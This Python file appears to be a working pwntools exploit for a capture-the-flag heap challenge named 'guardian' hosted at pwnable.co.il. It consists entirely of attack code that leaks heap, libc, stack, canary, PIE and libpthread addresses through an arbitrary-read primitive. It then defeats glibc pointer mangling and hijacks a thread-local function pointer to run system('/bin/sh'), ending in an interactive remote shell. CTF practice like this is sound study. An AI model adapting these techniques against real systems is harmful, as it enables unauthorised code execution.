from pwn import *

#offsets
ENVIRON_OFFSET = 0x00000000003ee098
SYSTEM_OFFSET = 0x000000000004f440
BINSH_OFFSET = 0x1b3e9a
CANARY_OFFSET = 0x1fdc8

#padding
TLS_PADDING = 0xd8

def send_option(p: process, option: int):
    p.sendline(str(option))

def create_guardian(p: process, index: int = 0, size: int = 5, name: str = "name", op: int = 1, op_data: str = "weapon"):
    send_option(p, 1)
    p.sendline(str(index))
    p.sendline(str(size))
    p.sendline(name)
    p.sendline(str(op))
    if op in [1,2]:
        p.sendline(op_data)
    p.recvuntil(">")

def del_guardian(p: process, index: int = 0):
    send_option(p, 4)
    p.sendline(str(index))
    p.recvuntil(">")

def get_name(p: process, index: int = 0):
    send_option(p, 2)
    p.sendline(str(index))
    p.recvuntil("I'm ")
    name = p.recvuntil(" and")[:-3]
    p.recvuntil(">")
    return name

def get_data(p: process, index: int = 0, op: int = 1):
    send_option(p, 2)
    p.sendline(str(index))
    if op == 1:
        p.recvuntil("the ")
    else:
        p.recvuntil("of ")
    data = p.recvuntil("\n1.")[:-3]
    p.recvuntil(">")
    return data

def arbitrary_read(p: process, addr: int):
    create_guardian(p, op = 2, op_data = str(addr))
    del_guardian(p)
    create_guardian(p, op = 5)
    data = get_data(p)
    del_guardian(p)
    return data

def leak_heap(p: process):
    create_guardian(p, 0, op = 2, op_data="123")
    create_guardian(p, 1, op = 2, op_data="123")
    del_guardian(p, 0)
    del_guardian(p, 1)
    create_guardian(p, op_data = "a"*7)
    heap = int.from_bytes(get_data(p, 0)[8:], 'little') - 0x290
    del_guardian(p)
    print("heap: ", hex(heap))
    return heap

def leak_libc(p: process, heap: int):
    for i in range(3):
        create_guardian(p, index=i, size = 0x500, name="a"*0x500, op = 2, op_data="123")

    for i in range(3):
        del_guardian(p, i)

    libc = int.from_bytes(arbitrary_read(p, heap + 0x300), 'little') - 0x3ebca0
    print("libc: ", hex(libc))
    return libc

def leak_stack(p: process, libc: int):
    stack = int.from_bytes(arbitrary_read(p, libc + ENVIRON_OFFSET), 'little')
    print("stack: ", hex(stack))
    return stack

def leak_canary(p: process, stack: int):
    canary = int.from_bytes(arbitrary_read(p, stack - 0x10f)[:-6], 'little') << 8
    print("canary: ", hex(canary))
    return canary

def leak_p_guard(p: process, libc: int):
    p_guard = int.from_bytes(arbitrary_read(p, libc + 0x829770), 'little') 
    print("p_guard: ", hex(p_guard))
    return p_guard

def leak_chunk(p: process, data: str):
    for i in range(3):
        create_guardian(p, i, op = 2, op_data="123")

    for i in range(3):
        del_guardian(p, i)

    create_guardian(p, size = len(data), name = data, op_data = "a"*7)
    addr = int.from_bytes(get_data(p, 0)[8:], 'little') + 0x530
    print("chunk: ", hex(addr))
    return addr

def leak_PIE(p: process, stack: int):
    pie = int.from_bytes(arbitrary_read(p, stack - 0x170), 'little') - 0x9a3
    print("PIE: ", hex(pie))
    return pie

def leak_libpthread(p: process, pie: int):
    pthread_create = int.from_bytes(arbitrary_read(p, pie + 0x2f50), 'little')
    libpthread = pthread_create - 0x79b0
    print("libpthread: ", hex(libpthread))
    return libpthread

def new_function_struct(p: process, param: int, addr: int):
    return p64(addr) + p64(param) + b"c" * 0x10

def fight(p: process, weapon: str, index: int = 0, guard: int = 0):
    send_option(p, 3)
    p.sendline(str(guard))
    p.sendline(str(index))
    p.sendline(weapon)
    print(weapon)

def main():
    ### run ###
    #p = process("./guardian")
    p = remote("pwnable.co.il", 9018)
    p.sendline("")
    p.recvuntil(">")

    ### leaks ###
    heap = leak_heap(p)
    libc = leak_libc(p, heap)
    stack = leak_stack(p, libc)
    canary = leak_canary(p, stack)
    pie = leak_PIE(p, stack)
    libpthread = leak_libpthread(p, pie)

    ### payload start ###
    fs_base = libpthread +  0x43e740 #start of fs_base
    p_guard = int.from_bytes(arbitrary_read(p, fs_base + 0x30), 'little')
    print("p_guard: ", hex(p_guard))
    func = libc + SYSTEM_OFFSET
    func ^= p_guard
    func = rol(func, 0x11, word_size=64)
    data = new_function_struct(p, libc + BINSH_OFFSET, func)
    ptr_function_struct = leak_chunk(p, data)
    fight(p, b"a" * TLS_PADDING + p64(ptr_function_struct), 9)
    p.interactive()

if __name__ == "__main__":
    main()